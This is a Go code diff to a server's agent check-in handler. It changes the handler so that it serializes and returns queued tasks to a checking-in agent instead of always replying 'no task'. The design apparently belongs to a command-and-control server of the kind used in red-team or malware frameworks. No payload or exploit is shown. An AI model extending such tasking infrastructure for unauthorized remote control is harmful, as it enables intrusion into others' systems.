@@ -36,15 +36,32 @@ func (s *Server) HandleAgentCheckin(w http.ResponseWriter, r *http.Request) {
 
 	switch code {
 	case CODE_CHECK_IN:
-		if _, err := s.DB.GetTasks(agentID); err != nil {
+		tasks, err := s.DB.GetTasks(agentID)
+		if err != nil {
 			utils.Return500(w, "failed getting tasks")
 			return
 		}
-		pw := parser.NewWriter()
-		pw.Write4(TASK_NO_TASK)
-		w.Header().Set("Content-Type", "application/octet-stream")
-		w.Write(pw.Bytes())
-		fmt.Println("[*] Sending back no task")
+		if tasks == nil {
+			pw := parser.NewWriter()
+			pw.Write4(TASK_NO_TASK)
+			fmt.Println("[*] Sending back no task")
+			w.Header().Set("Content-Type", "application/octet-stream")
+			w.Write(pw.Bytes())
+			return
+		} else {
+			pw := parser.NewWriter()
+			data, err := pw.WriteTasks(tasks)
+			if err != nil {
+				utils.Return500(w, "failed serializing tasks")
+				return
+			}
+			w.Header().Set("Content-Type", "application/octet-stream")
+			w.Write(data)
+		}
+
+
+		
+
 	case CODE_REGISTER:
 		agent, err := reader.ParseRegister(agentID)
 		if err != nil {
@@ -70,6 +87,8 @@ func (s *Server) HandleAgentCheckin(w http.ResponseWriter, r *http.Request) {
 		})
 		w.WriteHeader(http.StatusOK)
 		return
+
+
 
 	default:
 		return
